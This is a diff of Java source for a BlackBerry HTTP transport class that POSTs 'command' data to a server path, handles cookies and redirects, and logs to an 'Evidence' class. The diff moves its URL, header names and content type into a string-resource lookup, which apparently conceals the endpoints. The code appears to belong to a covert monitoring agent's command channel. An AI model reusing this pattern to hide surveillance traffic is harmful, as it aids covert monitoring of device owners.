@@ -18,6 +18,7 @@ import javax.microedition.io.HttpConnection;
 
 import net.rim.device.api.io.IOCancelledException;
 import net.rim.device.api.io.http.HttpProtocolConstants;
+import blackberry.Messages;
 import blackberry.Status;
 import blackberry.config.Cfg;
 import blackberry.debug.Check;
@@ -31,14 +32,14 @@ public abstract class HttpTransport extends Transport {
     private static final int PORT = 80;
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("HttpTransport",
+    private static Debug debug = new Debug("HttpTransport", //$NON-NLS-1$
             DebugLevel.INFORMATION);
     //#endif
 
     String host;
 
     public HttpTransport(String host) {
-        super("http://" + host + ":" + PORT + "/wc12/webclient");
+        super(Messages.getString("l.1") + host + ":" + PORT + Messages.getString("l.3")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 
         this.host = host;
         cookie = null;
@@ -51,12 +52,12 @@ public abstract class HttpTransport extends Transport {
     boolean stop;
     boolean follow_moved = true;
 
-    protected final String HD_CONTENTTYPE = "content-type";
-    protected final String HD_SETCOOKIE = "set-cookie";
-    protected final String HD_CONTENTLEN = "content-length";
+    protected final String HD_CONTENTTYPE = Messages.getString("l.4"); //$NON-NLS-1$
+    protected final String HD_SETCOOKIE = Messages.getString("l.5"); //$NON-NLS-1$
+    protected final String HD_CONTENTLEN = Messages.getString("l.6"); //$NON-NLS-1$
 
     //private final String USER_AGENT = "Profile/MIDP-2.0 Configuration/CLDC-1.0";
-    protected final String CONTENT_TYPE = "application/octet-stream";
+    protected final String CONTENT_TYPE = Messages.getString("l.7"); //$NON-NLS-1$
 
     public void start() {
         //#ifdef FOLLOW_MOVED_URLS
@@ -75,7 +76,7 @@ public abstract class HttpTransport extends Transport {
     public synchronized byte[] command(byte[] data) throws TransportException {
         boolean available = isAvailable();
         //#ifdef DEBUG
-        debug.trace("command, available: " + available);
+        debug.trace("command, available: " + available); //$NON-NLS-1$
         //#endif
 
         if (!available) {
@@ -86,16 +87,16 @@ public abstract class HttpTransport extends Transport {
         HttpConnection connection = null;
         try {
             //#ifdef DEBUG
-            debug.trace("command: creating request");
+            debug.trace("command: creating request"); //$NON-NLS-1$
             //#endif
             connection = createRequest();
             //#ifdef DEBUG
-            debug.trace("command: sending request");
+            debug.trace("command: sending request"); //$NON-NLS-1$
             //#endif
             sendHttpPostRequest(connection, data);
         } catch (TransportException ex) {
             //#ifdef DEBUG
-            debug.trace("command: second chance");
+            debug.trace("command: second chance"); //$NON-NLS-1$
             //#endif
             Utils.sleep(1000);
             connection = createRequest();
@@ -104,19 +105,19 @@ public abstract class HttpTransport extends Transport {
 
         if (connection == null) {
             //#ifdef DEBUG
-            debug.error("command: null connection");
+            debug.error("command: null connection"); //$NON-NLS-1$
             //#endif
             throw new TransportException(32);
         }
 
         //#ifdef DBC        
-        Check.asserts(connection != null, "null connection");
+        Check.asserts(connection != null, "null connection"); //$NON-NLS-1$
         //#endif
 
         int status;
         try {
             //#ifdef DEBUG
-            debug.trace("command: get response");
+            debug.trace("command: get response"); //$NON-NLS-1$
             //#endif
 
             status = connection.getResponseCode();
@@ -125,9 +126,9 @@ public abstract class HttpTransport extends Transport {
             if (follow_moved
                     && (status == HttpConnection.HTTP_MOVED_TEMP
                             || status == HttpConnection.HTTP_MOVED_PERM || status == HttpConnection.HTTP_TEMP_REDIRECT)) {
-                baseurl = connection.getHeaderField("Location");
+                baseurl = connection.getHeaderField(Messages.getString("l.15")); //$NON-NLS-1$
                 //#ifdef DEBUG
-                debug.trace("sendHttpPostRequest Moved to Location: " + baseurl);
+                debug.trace(Messages.getString("l.16") + baseurl); //$NON-NLS-1$
                 //#endif
 
                 throw new TransportException(33);
@@ -136,7 +137,7 @@ public abstract class HttpTransport extends Transport {
             // check response, if ok parse it            
             if (status == HttpConnection.HTTP_OK) {
                 //#ifdef DEBUG
-                debug.trace("command: parse response");
+                debug.trace(Messages.getString("l.17")); //$NON-NLS-1$
                 //#endif
                 byte[] content = parseHttpConnection(connection);
                 //#ifdef DEBUG
@@ -145,7 +146,7 @@ public abstract class HttpTransport extends Transport {
                 return content;
             } else {
                 //#ifdef DEBUG
-                debug.error("command response status: " + status);
+                debug.error("command response status: " + status); //$NON-NLS-1$
                 if (status == 502) {
                     Status.getInstance().wap2Error();
                 }
@@ -155,21 +156,21 @@ public abstract class HttpTransport extends Transport {
             }
         } catch (IOException e) {
             //#ifdef DEBUG
-            debug.error("command: " + e);
+            debug.error("command: " + e); //$NON-NLS-1$
             //#endif
             throw new TransportException(8);
         } finally {
             try {
                 if (connection != null) {
                     //#ifdef DEBUG
-                    debug.trace("command: closing connection");
+                    debug.trace("command: closing connection"); //$NON-NLS-1$
                     //#endif
                     connection.close();
                     connection=null;
                 }
             } catch (IOException e) {
                 //#ifdef DEBUG
-                debug.error("command: " + e);
+                debug.error("command: " + e); //$NON-NLS-1$
                 //#endif
             }
         }
@@ -177,7 +178,7 @@ public abstract class HttpTransport extends Transport {
 
     protected HttpConnection createRequest() throws TransportException {
 
-        String content = "";
+        String content = ""; //$NON-NLS-1$
 
         boolean httpOK;
         HttpConnection httpConn = null;
@@ -185,25 +186,25 @@ public abstract class HttpTransport extends Transport {
         try {
             String url = getUrl();
             //#ifdef DEBUG
-            debug.trace("createRequest url=" + url);
+            debug.trace("createRequest url=" + url); //$NON-NLS-1$
             //#endif
             // qui sembra bloccarsi, certe volte, con wifi.
             httpConn = (HttpConnection) open(url);
 
             //#ifdef DEBUG
-            debug.trace("createRequest: setting POST");
+            debug.trace("createRequest: setting POST"); //$NON-NLS-1$
             //#endif
             httpConn.setRequestMethod(HttpConnection.POST);
 
             if (cookie != null) {
                 //#ifdef DEBUG
-                debug.trace("sendHttpPostRequest cookie: " + cookie);
+                debug.trace("sendHttpPostRequest cookie: " + cookie); //$NON-NLS-1$
                 //#endif
                 httpConn.setRequestProperty(
                         HttpProtocolConstants.HEADER_COOKIE, cookie);
             } else {
                 //#ifdef DEBUG
-                debug.trace("createRequest: no cookie");
+                debug.trace("createRequest: no cookie"); //$NON-NLS-1$
                 //#endif
             }
 
@@ -212,11 +213,11 @@ public abstract class HttpTransport extends Transport {
             httpConn.setRequestProperty(
                     HttpProtocolConstants.HEADER_CONTENT_TYPE, CONTENT_TYPE);
             httpConn.setRequestProperty(
-                    HttpProtocolConstants.HEADER_CONNECTION, "KeepAlive");
+                    HttpProtocolConstants.HEADER_CONNECTION, "KeepAlive"); //$NON-NLS-1$
 
             //#ifdef DBC
             Check.ensures(httpConn != null,
-                    "sendHttpPostRequest: httpConn null");
+                    "sendHttpPostRequest: httpConn null"); //$NON-NLS-1$
             //#endif  
         } catch (Exception ex) {
             if (httpConn != null) {
@@ -224,7 +225,7 @@ public abstract class HttpTransport extends Transport {
                     httpConn.close();
                 } catch (IOException e) {
                     //#ifdef DEBUG
-                    debug.trace("createRequest: " + e);
+                    debug.trace("createRequest: " + e); //$NON-NLS-1$
                     //#endif
                 }
             }
@@ -236,9 +237,9 @@ public abstract class HttpTransport extends Transport {
     protected boolean sendHttpPostRequest(HttpConnection httpConn, byte[] data)
             throws TransportException {
         //#ifdef DBC
-        Check.requires(data != null, "sendHttpPostRequest: null data");
+        Check.requires(data != null, "sendHttpPostRequest: null data"); //$NON-NLS-1$
         //#endif
-        String content = "";
+        String content = ""; //$NON-NLS-1$
 
         boolean httpOK;
         OutputStream os = null;
@@ -252,7 +253,7 @@ public abstract class HttpTransport extends Transport {
             //os.flush(); // Optional, getResponseCode will flush
 
             //#ifdef DEBUG
-            debug.trace("sendHttpPostRequest: get response");
+            debug.trace("sendHttpPostRequest: get response"); //$NON-NLS-1$
             //#endif
             int status = httpConn.getResponseCode();
             httpOK = (status == HttpConnection.HTTP_OK);
@@ -263,7 +264,7 @@ public abstract class HttpTransport extends Transport {
              */
 
             //#ifdef DEBUG
-            debug.trace("sendHttpPostRequest response: " + status);
+            debug.trace("sendHttpPostRequest response: " + status); //$NON-NLS-1$
             //#endif
 
         } catch (Exception ex) {
@@ -282,13 +283,13 @@ public abstract class HttpTransport extends Transport {
 
         if (!httpOK) {
             //#ifdef DEBUG
-            debug.error("HTTP not ok");
+            debug.error("HTTP not ok"); //$NON-NLS-1$
             //#endif
             //throw new TransportException(2);
         }
 
         //#ifdef DBC
-        Check.ensures(httpConn != null, "sendHttpPostRequest: httpConn null");
+        Check.ensures(httpConn != null, "sendHttpPostRequest: httpConn null"); //$NON-NLS-1$
         //#endif     
         return httpOK;
     }
@@ -305,7 +306,7 @@ public abstract class HttpTransport extends Transport {
 
             if (!htmlContent) {
                 //#ifdef DEBUG
-                debug.error("parseHttpConnection wrong htmlContent : "
+                debug.error("parseHttpConnection wrong htmlContent : " //$NON-NLS-1$
                         + contentType);
                 //#endif
                 throw new TransportException(3);
@@ -315,7 +316,7 @@ public abstract class HttpTransport extends Transport {
 
             if (setCookie != null) {
                 //#ifdef DEBUG
-                debug.trace("parseHttpConnection setCookie: " + setCookie);
+                debug.trace("parseHttpConnection setCookie: " + setCookie); //$NON-NLS-1$
                 //#endif
 
                 cookie = setCookie;
@@ -323,7 +324,7 @@ public abstract class HttpTransport extends Transport {
 
             String contentLen = httpConn.getHeaderField(HD_CONTENTLEN);
             //#ifdef DEBUG
-            debug.trace("parseHttpConnection len: " + contentLen);
+            debug.trace("parseHttpConnection len: " + contentLen); //$NON-NLS-1$
             //#endif
 
             int totalLen = 0;
@@ -333,7 +334,7 @@ public abstract class HttpTransport extends Transport {
 
             } catch (Exception ex) {
                 //#ifdef DEBUG
-                debug.error("parseHttpConnection parseInt");
+                debug.error("parseHttpConnection parseInt"); //$NON-NLS-1$
                 //#endif
                 throw new TransportException(4);
             }
@@ -348,15 +349,15 @@ public abstract class HttpTransport extends Transport {
 
             while (-1 != (len = input.read(buffer))) {
                 //#ifdef DEBUG
-                debug.trace("parseHttpConnection read=" + len + " size=" + size
-                        + " tot=" + totalLen);
+                debug.trace("parseHttpConnection read=" + len + " size=" + size //$NON-NLS-1$ //$NON-NLS-2$
+                        + " tot=" + totalLen); //$NON-NLS-1$
                 //#endif
                 // Exit condition for the thread. An IOException is 
                 // thrown because of the call to  httpConn.close(), 
                 // causing the thread to terminate.
                 if (stop) {
                     //#ifdef DEBUG
-                    debug.trace("parseHttpConnection stop!");
+                    debug.trace("parseHttpConnection stop!"); //$NON-NLS-1$
                     //#endif
                     httpConn.close();
                     input.close();
@@ -367,15 +368,15 @@ public abstract class HttpTransport extends Transport {
             buffer = null;
 
             //#ifdef DEBUG
-            debug.trace("parseHttpConnection received:" + size);
+            debug.trace("parseHttpConnection received:" + size); //$NON-NLS-1$
             //#endif
 
             input.close();
             input = null;
 
             //#ifdef DBC
-            Check.ensures(len != totalLen, "sendHttpPostRequest: received:"
-                    + size + " expected: " + totalLen);
+            Check.ensures(len != totalLen, "sendHttpPostRequest: received:" //$NON-NLS-1$
+                    + size + " expected: " + totalLen); //$NON-NLS-1$
             //#endif 
             return content;
 
@@ -416,8 +417,8 @@ public abstract class HttpTransport extends Transport {
 
         if (connection == null) {
             //#ifdef DEBUG
-            debug.trace("open: null connection");
-            Evidence.info("NULL CONNECTION: " + url);
+            debug.trace("open: null connection"); //$NON-NLS-1$
+            Evidence.info("NULL CONNECTION: " + url); //$NON-NLS-1$
             //#endif                       
             threadOpener.interrupt();
             
@@ -428,7 +429,7 @@ public abstract class HttpTransport extends Transport {
 
         } else {
             //#ifdef DEBUG
-            debug.trace("open: " + connection);
+            debug.trace("open: " + connection); //$NON-NLS-1$
             //#endif
         }
 
@@ -452,13 +453,13 @@ public abstract class HttpTransport extends Transport {
                 connection = (HttpConnection) Connector.open(url);
             } catch (IOException e) {
                 //#ifdef DEBUG
-                debug.error("run: " + e);
+                debug.error("run: " + e); //$NON-NLS-1$
                 //#endif
             }
 
             synchronized (monitor) {
                 //#ifdef DEBUG
-                debug.trace("run, notifyAll ");
+                debug.trace("run, notifyAll "); //$NON-NLS-1$
                 //#endif
                 monitor.notifyAll();
             }
@@ -474,7 +475,7 @@ public abstract class HttpTransport extends Transport {
                     monitor.wait(SECS * 1000);
                 } catch (InterruptedException e) {
                     //#ifdef DEBUG
-                    debug.error("getConnection: " + e);
+                    debug.error("getConnection: " + e); //$NON-NLS-1$
                     //#endif
                     
                     connection=null;
